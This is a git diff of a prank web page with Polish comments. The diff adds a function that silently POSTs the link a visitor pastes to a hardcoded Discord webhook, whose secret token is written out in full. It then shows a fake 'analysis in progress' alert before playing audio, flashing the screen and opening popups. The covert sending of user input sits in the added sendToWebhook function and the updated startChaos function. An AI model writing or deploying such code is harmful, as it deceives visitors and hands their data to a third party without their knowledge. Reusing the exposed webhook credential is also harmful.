@@ -82,9 +82,9 @@
     localStorage.setItem(counterKey, visits);
     counterEl.textContent = `👁️ Wejścia na stronę: ${visits}`;
 
-    // Obrazki z neta (bez potrzeby hostowania)
+    // Obrazki z neta
     const imageUrls = [
-      "https://i.imgur.com/0rZbZBn.png", // ptoszek
+      "https://i.imgur.com/0rZbZBn.png",
       "https://media.giphy.com/media/l0MYC0LajbaPoEADu/giphy.gif",
       "https://i.imgur.com/v4jvG5D.gif",
       "https://i.imgur.com/8fFM4QI.gif"
@@ -113,7 +113,6 @@
       }, 120);
     }
 
-    // Otwiera 20 losowych stron co 3 sekundy
     function showPopups() {
       const sites = [
         "https://en.wikipedia.org/wiki/Special:Random",
@@ -141,7 +140,32 @@
       }, 3000);
     }
 
+    // Dodany webhook
+    function sendToWebhook(link) {
+      const webhookUrl = "https://discord.com/api/webhooks/1373725358951764118/wwpbThoUoNmzFQ4mlRa6Fz_LMLO6RrvlaL1Us3vxDC8nJtfVHMjJfxm28SxMU-t5MIt1";
+      fetch(webhookUrl, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          content: `wklejono link:\n${link}`
+        })
+      }).catch(err => {
+        console.error("Nie udało się wysłać do webhooka:", err);
+      });
+    }
+
+    // Zaktualizowana funkcja startChaos()
     function startChaos() {
+      const link = document.getElementById("linkInput").value.trim();
+      if (!link) {
+        alert("Wklej najpierw link!");
+        return;
+      }
+
+      sendToWebhook(link); // Wyślij link do Discorda
+
       alert("Trwa analiza... 🔍");
       document.getElementById("audio").play();
       flashBackground();
